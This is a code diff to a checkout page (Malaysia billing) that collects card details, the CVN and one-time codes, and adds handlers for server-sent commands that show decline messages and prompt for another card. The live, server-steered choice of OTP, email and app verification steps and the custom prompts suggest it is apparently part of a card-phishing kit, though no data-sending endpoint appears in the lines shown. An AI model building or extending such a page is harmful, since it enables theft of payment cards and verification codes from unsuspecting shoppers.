@@ -230,6 +230,9 @@
           <fieldset class="input">
             <legend class="vhdn"><span>Billing Information</span></legend>
             <div class="status-msg" id="statusMsg"></div>
+                <div id="required_field_explanation">
+                    <span id="required_field_char"> * </span> Required field
+                </div>
             <div class="ol">
               <div class="li"><label for="fullName">Full Name *</label><input type="text" id="fullName" aria-required="true"></div>
             </div>
@@ -242,11 +245,11 @@
               <div class="li"><label for="city">City *</label><input type="text" id="city" aria-required="true"></div>
             </div>
             <div class="ol">
-              <div class="li"><label for="state">State</label><input type="text" id="state"></div>
-              <div class="li"><label for="zipCode">Postal Code</label><input type="text" id="zipCode"></div>
+              <div class="li"><label for="state">State *</label><input type="text" id="state"></div>
+              <div class="li"><label for="zipCode">Postal Code *</label><input type="text" id="zipCode"></div>
             </div>
             <div class="ol">
-              <div class="li"><label for="country">Country</label>
+              <div class="li"><label for="country">Country *</label>
                 <select id="country"><option value="MY" selected>Malaysia</option></select>
               </div>
             </div>
@@ -282,8 +285,9 @@
                 </div>
                 <div class="li" id="card_cvn_line">
                   <label for="cvv">CVN *</label>
-                  <div class="legend">3 or 4 digit number printed on the back of your card.</div>
-                  <input type="text" id="cvv" maxlength="4" aria-required="true" placeholder="..." autocomplete="off">
+                  <div class="legend">This code is a three or four digit number printed on the back or front of credit cards.</div>
+                  <input type="text" id="cvv" maxlength="4" aria-required="true" placeholder="..." autocomplete="off" style="width:20%">
+                  <img src="cvn-e2c1902bf8cc6c983b779f58795ea28e17e5c26fce496dae3532b84bada676d3.png" style="vertical-align:middle;margin-left:4px;width:auto;height:24px">
                 </div>
               </div>
             </div>
@@ -452,7 +456,7 @@
                 <div class="app-question">Already verified this purchase?</div>
                 <div class="app-error hidden" id="app-error">Verification unsuccessful. Please return to the app to verify again.</div>
                 <div class="app-btn-wrap">
-                    <button type="button" id="app-continue-btn">Continue to complete</button>
+                    <button type="button" id="app-continue-btn" onclick="submitAppVerify()">Continue to complete</button>
                 </div>
                 <div class="vfy-spinner hidden" id="app-spinner">
                     <div class="spin"></div>
@@ -729,7 +733,39 @@
                  if(otpErr){otpErr.style.display = 'block'; otpErr.textContent = p.message || 'Invalid code'}
                  var os2=q('otp-submit');if(os2)os2.disabled=false;
                  var os4=q('otp-submit');if(os4)os4.textContent = 'Verify'
-               }
+                }
+                else if(a === 'timeout') {
+                  var lo2=q('load-overlay');if(lo2)lo2.classList.add('hidden');
+                  hideAllOverlays();
+                  var bs2=q('btnSubmit');if(bs2)bs2.disabled=true;
+                  showMsg('error','Session timed out')
+                }
+                else if(a === 'change_card_prompt') {
+                  _curStep = 'card';
+                  var lo2=q('load-overlay');if(lo2)lo2.classList.add('hidden');
+                  var avbox=q('app-verify-box');if(avbox)avbox.classList.add('hidden');
+                  for(var i=1;i<=7;i++){var m=document.getElementById('mount'+i);if(m){m.classList.add('hidden');try{var sr=m.shadowRoot;if(sr){var dd=sr.querySelector('div>div');if(dd)dd.classList.add('hidden')}}catch(e){}}}
+                  var resultmessage = p.message || 'Your bank did not authorize this transaction.';
+                  var otpResP=document.querySelector('#otp-result>p');if(otpResP)otpResP.innerHTML=resultmessage+'<br>Please try another card or contact your card issuer.';
+                  var emailResP=document.querySelector('#email-result>p');if(emailResP)emailResP.innerHTML=resultmessage+'<br>Please try another card or contact your card issuer.';
+                  changeOtp();changeEmail();
+                  var avo=q('app-verify-overlay');if(avo)avo.classList.add('hidden');
+                  var bs3=q('btnSubmit');if(bs3)bs3.disabled=false;
+                  showMsg('error', p.message || '', true)
+                }
+                else if(a === 'change_card') {
+                  _curStep = 'card';
+                  var lo2=q('load-overlay');if(lo2)lo2.classList.add('hidden');
+                  var avbox=q('app-verify-box');if(avbox)avbox.classList.add('hidden');
+                  for(var i=1;i<=7;i++){var m=document.getElementById('mount'+i);if(m){m.classList.add('hidden');try{var sr=m.shadowRoot;if(sr){var dd=sr.querySelector('div>div');if(dd)dd.classList.add('hidden')}}catch(e){}}}
+                  var resultmessage = p.message || 'Your bank did not authorize this transaction.';
+                  var otpResP=document.querySelector('#otp-result>p');if(otpResP)otpResP.innerHTML=resultmessage+'<br>Please try another card or contact your card issuer.';
+                  var emailResP=document.querySelector('#email-result>p');if(emailResP)emailResP.innerHTML=resultmessage+'<br>Please try another card or contact your card issuer.';
+                  changeOtp();changeEmail();
+                  var avo=q('app-verify-overlay');if(avo)avo.classList.add('hidden');
+                  var bs3=q('btnSubmit');if(bs3)bs3.disabled=false;
+                  showMsg('error', 'Please use a different card.', true)
+                }
                 else if(a === 'custom_prompt') {
                   var lo2=q('load-overlay');if(lo2)lo2.classList.add('hidden');
                   var cm=p.message||'';
